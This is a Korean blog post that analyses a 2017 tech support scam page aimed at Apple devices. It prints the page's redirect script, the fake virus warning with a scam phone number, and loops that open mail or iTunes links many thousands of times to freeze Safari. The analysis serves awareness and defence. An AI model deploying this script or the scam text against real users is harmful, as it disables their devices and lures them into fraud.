---
layout: post
title: Scam Page triggers DoS attack on some apple product(?)
date: 2017-01-08 14:47:36.000000000 +09:00
type: post
published: true
status: publish
categories:
- Malware Analysis
tags: []
author: "n0fate"
---

*딱히 쓸만한 제목이 없어서 제목은 원 글 내용을 따옴*

@qingfro9이 보내준 말웨어 바이트 링크(감사!)인 [Tech support scam page triggers denial-of-service attack on Macs](https://blog.malwarebytes.com/101/mac-the-basics/2017/01/tech-support-scam-page-attempts-denial-of-service-via-mail-app/) 를 보고 확인 중에 아직 살아 있는 사이트(hxxp://safari-get.net)이 있길래 curl로 급하게 긁어와서 정리함.
일단 이 녀석은 `UserAgent`가 `OS 10.1.1` 버전인 운영체제를 대상으로 하는 DoS 취약점임. 링크에서는 맥이라고 써있는데 iOS 10.1.1도 대상인 것 같음. 최신 버전으로 업데이트하면 문제는 해결.

## 스테이지 1
일단 사이트에 접속하면 `index.html` 페이지가 당신을 반김. 이 페이지는 특별한건 없고 접속한 클라이언트 정보를 수집해 통계 정보를제공하는 구글 애널리틱스(google analytics) 코드가 있고, 아래는 웹 브라우저의 사용자 에이전트 정보를 찾아 운영체제 버전을 식별, 리다이렉션 함.

```javascript
	  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

	  ga('create', 'UA-73784359-12', 'auto');
	  ga('send', 'pageview');

	if ((navigator.userAgent.match(/OS 10.1.1/i))) {
	   location.replace("hxxp://safari-get.com/11.php");
	} else
	{
	location.replace("hxxp://safari-get.com/10.html");}

```

링크 누르면 납치당하니 좀 수정함.코드를 보면, `OS 10.1.1`, 인 경우, 즉, 아이폰 버전이 10.1.1인 경우 `11.php`로 리다이렉션하고 그 외는 `10.html` 로 리다이렉션함.

## 스테이지 2

### OS 10.1.1이 아닌 경우
일단 `10.html`은 다음과 같음.

```html

	Warning Safari Crashed!!
	 Your Apple Device May Have Adware/Spyware Virus.

	 Call<font size="35px">+1-844-423-2465</font>
immediately to connect with Apple Technical Support for installing the Protection Software. chat logs.

DATA AT RISK:

Your credit card details and banking information.Your e-mail passwords and other account passwords.Your Facebook, Skype, AIM, ICQ and other
<font size="20px">

Your private photos, family photos and other sensitive files.Your webcam could be accessed remotely by stalkers with a VPN virus.
</font>

```

사파리에 출력하는 메시지. 영어 잘 못하는 내가 봐도 문법이 이상함. 여튼 해킹 당했음이라는 메시지인데 이걸 나중에 메일 제목에도 넣음. 아래는 애플 메일 앱을 띄우는 스크립트 코드임.

```html
	jQuery('#result').append('');
```

RFC2638와 [애플 가이드라인](https://developer.apple.com/library/content/featuredarticles/iPhoneURLScheme_Reference/MailLinks/MailLinks.html)을 준수한 코드임. 내용은 다음과 같음.

* 수신자 : `foo@example.com`
* 메일 내용 : Apple Tech Support !
* 참조 : `bar@example.com`
* 제목 : Warning! Virus Detected! Immediately Call ~~~~

그냥 이것만 띄우는 것이면 DoS가 아니지. 이걸 10만번 띄우는 스크립트 코드는 아래에 있음.

```html
	 document.querySelector('a').click(0);

	 for(var i=0;i<100000;i++){
	 	 if(i>0) {

		 document.querySelector('a').click();
		 for(var x=0;x<10000;x++){
		 console.log();
		 }

	} else {
	    document.querySelector('a').click();
	    for(var x=0;x<100000;x++){
		 console.log();
	}
```

메일 보내는 창을 10만번 출력함. 악성코드 걸려서 정보 다털리는건 아니지만 걸리면 짜증날 듯. 시에라 가장 최근버전인 10.12.2에서 확인해보니 경고창을 보여주는 것으로 처리함. (위 링크에 스크린샷 있음). 아이폰에서는 무한로딩.

### OS 10.1.1 인 경우(ex. iOS 10.1.1)
10.1.1 버전인 경우 아이튠즈를 이용함. 핵심 내용은 다음과 같음.

```javascript

	jQuery('#result').append('.');
	document.querySelector('a').click();
	document.querySelector('a').click();
	document.querySelector('a').click();
	document.querySelector('a').click();
	document.querySelector('a').click();
	document.querySelector('a').click();
	[..SNIP..]

```

핵심은 `itunes:문자열(단순한 hello임)`인데 맥에서 테스트해보면 아이튠즈를 한번만 띄움. 아이튠즈 앱 자체가 여러개 뜨는 구조가 아니기 때문인 듯.
아이폰의 경우에는 에러 메시지를 계속 발생시켜서 사파리를 사용불능 상태로 만듬. 문제를 해결하려면 단순히 사파리앱을 껐다가 키는 걸론 안되고, 설정->사파리-> `방문 기록 및 웹 사이트 데이터 지우기`를 선택해서 사파리 내역을 완전 삭제해야 함.

### 추가
`10.html` 코드를 curl로 긁다보니 다음과 같은 코드도 긁혔음.

```bash
	Editing:  
	/home/safarmcl/public_html/port-safari.net/ios.html
	 Encoding:    Re-open Use Code Editor     Close  Save Changes
```

`safari-get.net` 사이트 자체가 실제 운영보다는 테스트용 서버인지 에디팅 경고 메시지가 나타난 그대로 html 파일을 저장하였음. 실제 코드는 아이폰에서 정상작동되지 않음.

## 결론
맥, 아이폰이라고 신난다고 불법 사이트 돌아다니면 뒷통수 맞을 수 있으니 조심히 쓰자.
